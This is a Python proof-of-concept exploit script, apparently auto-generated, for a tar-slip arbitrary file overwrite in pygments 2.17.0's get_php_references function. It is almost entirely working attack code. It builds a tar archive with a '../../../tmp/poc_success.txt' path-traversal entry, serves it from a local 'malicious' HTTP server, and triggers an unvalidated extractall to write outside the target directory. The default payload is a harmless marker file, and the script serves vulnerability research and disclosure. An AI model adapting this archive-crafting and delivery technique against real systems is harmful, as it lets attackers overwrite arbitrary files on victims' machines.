#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: afo-000
# Sink: get_php_references
# Auto-generated — run with: python3 afo_sink_function_tar_get_php_references.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pygments-2.17.0 Arbitrary File Overwrite (AFO)
via tar slip in get_php_references().

Vulnerability: tar.extractall() is called on a tar archive downloaded from a
hardcoded URL without any path validation. An attacker who can perform a
man-in-the-middle attack or compromise the download source can craft a tar
archive with path traversal entries (e.g., ../../../tmp/poc_success.txt) to
overwrite arbitrary files.

This PoC simulates the attack by:
1. Setting up a local HTTP server that serves a malicious tar archive.
2. Modifying the PHP_MANUAL_URL to point to our malicious server.
3. Triggering the vulnerable code path (get_php_references) which downloads
   and extracts the archive, writing a file outside the intended extraction
   directory.

Usage:
    python3 poc_pygments_afo.py

The PoC is safe by default — it writes a benign marker file to /tmp/poc_success.txt.
"""

import os
import sys
import tempfile
import shutil
import tarfile
import threading
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.request import urlretrieve

# =============================================================================
# Configuration
# =============================================================================
# The malicious tar archive will contain a file with this path traversal payload.
# By default, it writes to /tmp/poc_success.txt (safe).
PAYLOAD_PATH = "../../../tmp/poc_success.txt"
PAYLOAD_CONTENT = b"POC_SUCCESS: pygments-2.17.0 tar slip exploit worked!\n"

# The port for our local malicious HTTP server
MALICIOUS_SERVER_PORT = 9999

# =============================================================================
# Step 1: Create a malicious tar archive with path traversal
# =============================================================================
def create_malicious_tar(output_path):
    """
    Creates a tar archive containing a single file with a path traversal name.
    The file will be extracted to PAYLOAD_PATH relative to the extraction directory.
    """
    print(f"[*] Creating malicious tar archive at: {output_path}")
    with tarfile.open(output_path, "w") as tar:
        # Create a TarInfo object with the malicious path
        info = tarfile.TarInfo(name=PAYLOAD_PATH)
        info.size = len(PAYLOAD_CONTENT)
        # Add the file to the archive
        tar.addfile(info, fileobj=__import__('io').BytesIO(PAYLOAD_CONTENT))
    print(f"[+] Malicious tar archive created with payload: {PAYLOAD_PATH}")

# =============================================================================
# Step 2: Set up a local HTTP server to serve the malicious archive
# =============================================================================
class MaliciousHandler(SimpleHTTPRequestHandler):
    """Handler that serves the malicious tar archive."""
    def do_GET(self):
        # Serve the malicious tar file regardless of the requested path
        self.send_response(200)
        self.send_header("Content-Type", "application/x-tar")
        self.send_header("Content-Length", str(os.path.getsize(self.server.malicious_tar_path)))
        self.end_headers()
        with open(self.server.malicious_tar_path, "rb") as f:
            self.wfile.write(f.read())

def start_malicious_server(tar_path):
    """
    Starts a simple HTTP server on localhost:MALICIOUS_SERVER_PORT that serves
    the malicious tar archive.
    """
    server = HTTPServer(("127.0.0.1", MALICIOUS_SERVER_PORT), MaliciousHandler)
    server.malicious_tar_path = tar_path
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Malicious HTTP server started on http://127.0.0.1:{MALICIOUS_SERVER_PORT}")
    return server

# =============================================================================
# Step 3: Simulate the vulnerable code path
# =============================================================================
def simulate_vulnerable_extraction():
    """
    Simulates the vulnerable get_php_references() function from pygments.
    Instead of using the hardcoded PHP_MANUAL_URL, we point it to our malicious
    server. The function downloads the tar archive and extracts it using
    tar.extractall() without path validation.
    """
    # Create a temporary directory to simulate the extraction target
    extract_dir = tempfile.mkdtemp(prefix="pygments_poc_")
    print(f"[*] Simulating extraction into: {extract_dir}")

    # Change to the extraction directory (as the original code does implicitly)
    original_cwd = os.getcwd()
    os.chdir(extract_dir)

    try:
        # Simulate the vulnerable code:
        # download = urlretrieve(PHP_MANUAL_URL)
        # with tarfile.open(download[0]) as tar:
        #     tar.extractall()
        malicious_url = f"http://127.0.0.1:{MALICIOUS_SERVER_PORT}/malicious.tar"
        print(f"[*] Downloading malicious archive from: {malicious_url}")
        downloaded_path, _ = urlretrieve(malicious_url)
        print(f"[*] Downloaded to: {downloaded_path}")

        print("[*] Extracting archive with tar.extractall() (vulnerable call)...")
        with tarfile.open(downloaded_path) as tar:
            tar.extractall()
        print("[+] Extraction completed.")

        # Check if the payload file was written outside the extraction directory
        payload_abs_path = os.path.abspath(PAYLOAD_PATH)
        if os.path.exists(payload_abs_path):
            print(f"[+] SUCCESS: Payload file created at: {payload_abs_path}")
            with open(payload_abs_path, "rb") as f:
                content = f.read()
            print(f"[+] Payload content: {content.decode()}")
        else:
            print(f"[-] Payload file not found at: {payload_abs_path}")
            print("[*] Listing files in extraction directory:")
            for root, dirs, files in os.walk(extract_dir):
                for f in files:
                    print(f"    {os.path.join(root, f)}")

    finally:
        # Cleanup: remove the downloaded tar file
        if 'downloaded_path' in locals():
            os.remove(downloaded_path)
        # Change back to original directory
        os.chdir(original_cwd)
        # Remove the extraction directory (but not the payload if it escaped)
        shutil.rmtree(extract_dir, ignore_errors=True)

# =============================================================================
# Main execution
# =============================================================================
def main():
    print("=" * 60)
    print("pygments-2.17.0 Arbitrary File Overwrite PoC")
    print("=" * 60)

    # Step 1: Create malicious tar archive
    tar_path = os.path.join(tempfile.gettempdir(), "malicious_pygments_poc.tar")
    create_malicious_tar(tar_path)

    # Step 2: Start malicious HTTP server
    server = start_malicious_server(tar_path)
    time.sleep(0.5)  # Give server time to start

    try:
        # Step 3: Trigger the vulnerable extraction
        simulate_vulnerable_extraction()
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
    finally:
        # Cleanup: stop server and remove tar file
        server.shutdown()
        os.remove(tar_path)
        print("[*] Cleanup complete.")

if __name__ == "__main__":
    main()
